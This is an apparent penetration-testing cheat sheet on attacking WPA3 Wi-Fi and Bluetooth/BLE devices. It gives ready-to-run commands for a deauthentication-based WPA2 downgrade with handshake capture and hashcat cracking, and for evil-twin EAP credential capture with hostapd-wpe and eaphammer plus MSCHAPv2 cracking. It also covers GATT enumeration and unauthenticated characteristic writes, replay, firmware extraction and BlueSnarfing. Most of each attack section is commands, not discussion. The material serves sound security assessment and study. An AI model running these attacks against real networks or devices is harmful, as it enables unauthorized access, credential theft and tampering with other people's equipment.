# WPA3 and BLE — Transition Mode, Dragonblood, BLE Enumeration

---

## WPA3 overview

WPA3-SAE (Simultaneous Authentication of Equals) replaces PSK handshake with Dragonfly key exchange:
- Forward secrecy per session.
- Offline dictionary attacks against captured handshake not feasible (no PMKID equivalent in pure WPA3).
- Each authentication attempt requires real-time interaction.

**Attack surface (2024+):**
1. Transition mode (WPA2/WPA3 mixed) — most common in practice.
2. Dragonblood side-channel (CVE-2019-9494 / CVE-2019-9496) — patched in most firmware.
3. Beacon protection / MFP downgrade and SAE downgrade in transition mode.
4. SSID Confusion (CVE-2023-52424, WiSec 2024): a client authenticates to the
   correct RSN but ends up bound to a different SSID because the SSID is not
   authenticated in the 4-way handshake. Impact: VPN auto-disable rules that
   trust an SSID string fire on the wrong network. Requires the two networks to
   share credentials; useful in enterprise or roaming SSID pairs. Mitigation is
   the 802.11 Beacon Protection amendment plus binding SSID into KDF.

---

## WPA3 transition mode attack

Most APs running WPA3 also accept WPA2 connections for compatibility. Client association type depends on client capability.

```bash
# Check if AP advertises both WPA2 and WPA3
sudo airodump-ng wlan0mon | grep <SSID>
# ENC column: "WPA2 WPA3" or "SAE PSK" = transition mode

# If transition mode: force client to connect via WPA2
# 1. Deauth target client
sudo aireplay-ng -0 3 -a <AP_MAC> -c <client_MAC> wlan0mon

# 2. Capture WPA2 four-way handshake when client reconnects
sudo airodump-ng -c <ch> --bssid <AP_MAC> wlan0mon -w wpa3_transition

# If client is WPA3-capable and connects via SAE: capture fails for PSK
# Option: set up WPA2-only evil twin at higher power

# Crack captured WPA2 handshake normally
hcxpcapngtool -o hash.txt wpa3_transition*.cap
hashcat -m 22000 hash.txt rockyou.txt
```

---

## Dragonblood (CVE-2019-9494 / CVE-2019-9496)

Cache/timing side-channel against SAE handshake commit frame. Allows offline dictionary attack against WPA3-SAE on unpatched firmware (pre-2019 mostly).

```bash
# Dragonslayer tool (research tool, not widely maintained)
# Check if AP is vulnerable: firmware date before April 2019

# Practical status: most consumer routers patched. Enterprise APs: check vendor advisory.
# Primary value: identify unpatched older APs, document vulnerability class.

# Test: hostapd 2.8 and earlier, wpa_supplicant 2.7 and earlier
# CVE-2019-9494: timing leak in P-521 curve selection
# CVE-2019-9496: cache-based information leak
```

---

## WPA3-Enterprise (IEEE 802.1X / EAP)

No PSK — authentication via RADIUS server. Attack paths:

1. **Evil twin EAP downgrade**: rogue AP advertises weaker EAP method (PEAP-MSCHAPv2) → client may accept → capture MSCHAPv2 hash → crack offline.
2. **Certificate theft**: if client uses EAP-TLS, steal client certificate from host → use for legitimate auth.
3. **RADIUS credential spray**: if RADIUS accepts EAP-PEAP, spray domain credentials.

```bash
# hostapd-wpe — rogue AP for EAP credential capture (Kali package or aircrack-ng patch set)
# Edit /etc/hostapd-wpe/hostapd-wpe.conf:
#   interface=wlan1, ssid=<target_ssid>, channel=<ch>   (AP mode, NOT monitor)
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Captured hashes in ./hostapd-wpe.log (default; override with wpe_logfile=)

# Crack MSCHAPv2: challenge/response is NetNTLMv1-shape → hashcat -m 5500 (NOT 5600).
hashcat -m 5500 mschapv2_hash.txt rockyou.txt
# For a 100% crack of the NT hash regardless of password:
#   chapcrack parse <challenge> <response>  → DES keyspace via crack.sh

# eaphammer — full enterprise evil twin
python3 eaphammer -i wlan0mon --channel <ch> --auth wpa-eap \
  --essid "Corporate-WiFi" --creds
```

---

## Bluetooth / BLE enumeration

### BLE passive scan

> BlueZ marks `hcitool`, `hciconfig`, `gatttool`, `sdptool`, `hcidump` as
> **deprecated** and ships them only via the `bluez-deprecated` / `bluez-legacy`
> subpackage. Use `bluetoothctl`, `btmgmt`, `btmon`, and `btgatt-client` on
> current systems; keep the legacy commands only for read-only scripts on old boxes.

```bash
# bluetoothctl (preferred on BlueZ 5.x)
sudo bluetoothctl
[bluetooth]# power on
[bluetooth]# scan on           # LE + BR/EDR discovery (transport per controller filter)
[bluetooth]# devices           # list discovered
[bluetooth]# info <MAC>

# btmgmt — management daemon control (replaces hciconfig)
sudo btmgmt power on
sudo btmgmt find -l            # -l = LE only

# btmon — raw HCI trace (replaces hcidump)
sudo btmon

# hcitool (DEPRECATED, still present on Kali)
sudo hciconfig hci0 up
sudo hcitool lescan            # BLE passive scan
sudo hcitool scan              # Classic Bluetooth scan
sudo hcitool lecc <MAC>        # Connect to BLE device

# bettercap BLE recon
sudo bettercap
>> ble.recon on
>> ble.show
>> ble.enum <MAC>    # enumerate all GATT handles
```

### GATT service enumeration

```bash
# gatttool (DEPRECATED — kept for legacy scripts, unmaintained in BlueZ >= 5.44)
gatttool -b <device_MAC> -I
[<MAC>][LE]> connect
[<MAC>][LE]> primary          # list GATT services by UUID
[<MAC>][LE]> characteristics  # list characteristics with handles and properties
[<MAC>][LE]> char-val-read <handle>   # read characteristic value

# Preferred replacement: btgatt-client (BlueZ 5.x tools/ dir) or bluetoothctl's gatt.* menu.
# sudo btgatt-client -d <device_MAC>
# bluetoothctl → menu gatt → list-attributes / read / write / notify

# bettercap (more user-friendly)
>> ble.enum <MAC>
# Output: handle, UUID, properties (read/write/notify), value

# Read/write characteristic
>> ble.write <MAC> <UUID> <hex_data>
# Example: set characteristic: ble.write AA:BB:CC:DD:EE:FF 0x2A39 0xff
```

### BLE interesting characteristics

| UUID | Name | Note |
|------|------|------|
| 0x2A00 | Device Name | Often readable without pairing |
| 0x2A29 | Manufacturer | Device info |
| 0x2A24 | Model Number | Firmware/model |
| 0x2A26 | Firmware Revision | Version leak |
| 0x2A3D | String | Custom vendor data |
| Custom | Vendor-specific | Most attack surface here |

### BLE authentication bypass patterns

```bash
# 1. Unauthenticated writes: characteristics with WRITE property but no bonding required
# → test writes without pairing

# 2. Missing MAC randomization: device uses static MAC → trackable
# Record MAC: persistent across sessions = tracking vulnerability

# 3. Replay attack: capture BLE packet (Wireshark + nRF Sniffer), replay write command
# nRF Sniffer plugin for Wireshark captures BLE advertisements and connections

# 4. Firmware extraction via BLE OTA update characteristic
# If device accepts OTA update over BLE without auth → read firmware via DFU protocol
```

### BLE 5.4 surface (Core Spec Jan 2023)

Two new subsystems widen the attack surface for scoped assessments:

- **Encrypted Advertising Data (EAD)**: advertising / scan-response / EIR payload is
  AES-CCM'd with a Key Material (KM) exchanged over an encrypted GATT link (Key
  Material Characteristic). Attack checks: EAD key rotation / reuse, KM leak via
  an unauthenticated read on the KM characteristic, replay of frozen EAD blobs
  when the tag has no `randomizer` update.
- **Periodic Advertising with Responses (PAwR)**: bidirectional connectionless
  channel used by ESL, sensor swarms, low-power one-to-many control. Sniff with
  nRF Sniffer + Wireshark (>= 4.2 dissector), map subevents/response slots,
  check whether payloads use EAD or ship plaintext, and test injection into a
  response slot when timing is guessable.
- Firmware/toolchain: recent `bluez` (>= 5.72), current nRF Connect SDK
  (>= v2.5) and `nrf-sniffer-for-bluetooth-le` v4.x are needed to observe these.

### sparrow-wifi — RF survey tool

GUI tool for 2.4/5 GHz Wi-Fi and BLE on Linux.

```bash
sudo python3 sparrow-wifi.py
# Simultaneous Wi-Fi + BLE survey
# Shows BLE advertisement data, signal strength, vendor
# Export CSV for offline analysis
```

See `offensive-tools/wireless/sparrow-wifi/`.

---

## Classic Bluetooth attacks (legacy)

```bash
# BlueScanner — device discovery
hcitool scan       # discover visible devices
sdptool browse <MAC>   # enumerate SDP services

# BlueSnarfing (OBEX push without pairing — unpatched old devices)
ussp-push <MAC>@<channel> localfile remotefile

# Bluejacking — send unsolicited message via OBEX
# Primarily informational — no code execution
```

Most modern devices not vulnerable to classic BT attacks. Mainly relevant for embedded/IoT devices with old firmware.
